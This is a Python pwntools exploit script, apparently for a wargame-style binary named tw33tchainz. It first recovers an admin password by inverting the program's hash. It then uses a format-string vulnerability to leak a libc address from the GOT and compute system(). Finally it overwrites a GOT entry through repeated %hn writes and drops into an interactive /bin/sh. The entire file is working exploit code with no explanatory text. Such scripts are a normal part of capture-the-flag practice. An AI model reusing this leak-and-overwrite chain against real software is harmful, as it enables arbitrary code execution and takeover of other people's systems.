from pwn import *

p = process("./tw33tchainz")
ui.pause()


info="12345678901234\n12345678901234\nA"

print(p.recvuntil('Enter Username:'))
p.sendline(info)

print(p.recvuntil('Enter Salt:'))

print(p.recvline())
print(p.recvline())
hash=p.recvline()
#print(hash)
n=8
a=[hash[i:i+n] for i in range(0,len(hash),n)] #separte hash

x=int(a[0],16) # convert string to hex
#separate hash one byte
arr=[]*16
arr=[0 for i in range(16)]
arr[0]=x&0xff
arr[1]=(x>>8)&0xff
arr[2]=(x>>16)&0xff
arr[3]=(x>>24)&0xff
x=int(a[1],16) # convert string to hex
arr[4]=x&0xff
arr[5]=(x>>8)&0xff
arr[6]=(x>>16)&0xff
arr[7]=(x>>24)&0xff
x=int(a[2],16) # convert string to hex
arr[8]=x&0xff
arr[9]=(x>>8)&0xff
arr[10]=(x>>16)&0xff
arr[11]=(x>>24)&0xff
x=int(a[3],16) # convert string to hex
arr[12]=x&0xff
arr[13]=(x>>8)&0xff
arr[14]=(x>>16)&0xff
arr[15]=(x>>24)&0xff
#end separate hash
username=[]*16
username=[0x31,0x32,0x33,0x34,0x35,0x36,0x37,0x38,0x39,0x30,0x31,0x32,0x33,0x34,0xa,0]
salt=[]*16
salt=[0x31,0x32,0x33,0x34,0x35,0x36,0x37,0x38,0x39,0x30,0x31,0x32,0x33,0x34,0xa,0]

#calculate secrect_pass
secret=[]*16
secret=[0 for i in range(16)]
i=0 #index
while i<=15:
    ecx = username[i] ^ arr[i]
    secret_x = (ecx - salt[i])& 0xff

    secret[i]=secret_x
    i+=1


b=secret[0]+(secret[1]<<8)+(secret[2]<<16)+(secret[3]<<24)
c=secret[4]+(secret[5]<<8)+(secret[6]<<16)+(secret[7]<<24)
d=secret[8]+(secret[9]<<8)+(secret[10]<<16)+(secret[11]<<24)
e=secret[12]+(secret[13]<<8)+(secret[14]<<16)+(secret[15]<<24)
#choice=5
#end calculate secrect_pass

payload=b'1'
payload+=p8(0xa) #for clean_stdin
payload+=b'D'
payload+=p8(0xa) #for get_char
payload+=p8(0xa)

p.sendline(payload)
#*****
payload=b'3'
payload+=p8(0xa)
payload+=p32(b)
payload+=p32(c)
payload+=p32(d)
payload+=p32(e)
payload+=p8(0xa)
#
#************Exploit*******************



payload+=b'1'
payload+=p8(0xa) #for clean_stdin

payload+=b'|'
#payload+=b'AAAA'
payload+=p32(0x0804d068) #calloc
payload+=b'%8$s'
payload+=b'|||'
payload+=p8(0xa)  #for get_char
payload+=p8(0xa)


p.sendline(payload)

print(p.recvuntil('\x1b[1;33m|'))
leak_lib=p.recvuntil('|||')

print('LEAK_malloc')
print(leak_lib)


a=[leak_lib[i:i+4]for i in range(0,len(leak_lib),4)]
leak_calloc=int.from_bytes(a[1],"little")
print('LEAK_SYSTEM')
system=leak_calloc-265648
print(hex(system))



#overwrite exit int GOT

func=0x0804d064 #fput

#
#seperate 2 half of address
system_str=system
pad_addr1=system_str<<16
pad_addr1=pad_addr1>>24
pad_addr1=(pad_addr1&0xffff)-5
by1=pad_addr1&0xff
by2=(pad_addr1 >>8)-5

#pad1=(pad_addr1<<16)>>16 &0xff
pad_addr2=((system_str>>24)&0xff)
by3=pad_addr2+(0x0020<<8)-5

#end
#convert to bytes string
str_by1=bytes(str(by1),'ascii')
str_by2=bytes(str(by2),'ascii')
str_by3=bytes(str(by3),'ascii')
#end
#least 4 bytes
overwrite_got=b'1'
overwrite_got+=p8(0xa)  #for clean_stdin
overwrite_got+=b'A'
overwrite_got+=p32(func) #address
#overwrite_got+=b"%100000x" #--> thay 15 bang 5+pad=address_shell
overwrite_got+=b'%107x'
#payload+=b"%f%f%f%x%n" -> ton bytes
overwrite_got+=b'%8$hn'
overwrite_got+=p8(0xa) #for get_char
overwrite_got+=p8(0xa)
#end
p.sendline(overwrite_got)

#by2
overwrite_got=b'1'
overwrite_got+=p8(0xa)  #for clean_stdin
overwrite_got+=b'A'
overwrite_got+=p32(func+1) #address
#overwrite_got+=b"%100000x" #--> thay 15 bang 5+pad=address_shell
overwrite_got+=b'%'+str_by1+b'x'
#payload+=b"%f%f%f%x%n" -> ton bytes
overwrite_got+=b'%8$hn'
overwrite_got+=p8(0xa) #for get_char
overwrite_got+=p8(0xa)
#end
p.sendline(overwrite_got)
#
overwrite_got=b'1'
overwrite_got+=p8(0xa)  #for clean_stdin
overwrite_got+=b'A'
overwrite_got+=p32(func+2) #address
#overwrite_got+=b"%100000x" #--> thay 15 bang 5+pad=address_shell
overwrite_got+=b'%'+str_by2+b'x'
#payload+=b"%f%f%f%x%n" -> ton bytes
overwrite_got+=b'%8$hn'
overwrite_got+=p8(0xa) #for get_char
overwrite_got+=p8(0xa)
#end
p.sendline(overwrite_got)
#
overwrite_got=b'1'
overwrite_got+=p8(0xa)  #for clean_stdin
overwrite_got+=b'A'
overwrite_got+=p32(func+3) #address
#overwrite_got+=b"%100000x" #--> thay 15 bang 5+pad=address_shell
overwrite_got+=b'%'+str_by3+b'x'
#payload+=b"%f%f%f%x%n" -> ton bytes
overwrite_got+=b'%8$hn'
overwrite_got+=p8(0xa) #for get_char
overwrite_got+=p8(0xa)
#end
p.sendline(overwrite_got)
#

#
overwrite_got=b'1'
overwrite_got+=p8(0xa)  #for clean_stdin
overwrite_got+=b'"/bin/sh"\x00'

overwrite_got+=p8(0xa) #for get_char
overwrite_got+=p8(0xa)
#end
p.sendline(overwrite_got)
#

overwrite_got=b'3'
overwrite_got+=p8(0xa)  #for clean_stdin
overwrite_got+=b'1'

overwrite_got+=p8(0xa) #for get_char
overwrite_got+=p8(0xa)
#end
p.sendline(overwrite_got)

#end overwrite
p.interactive()
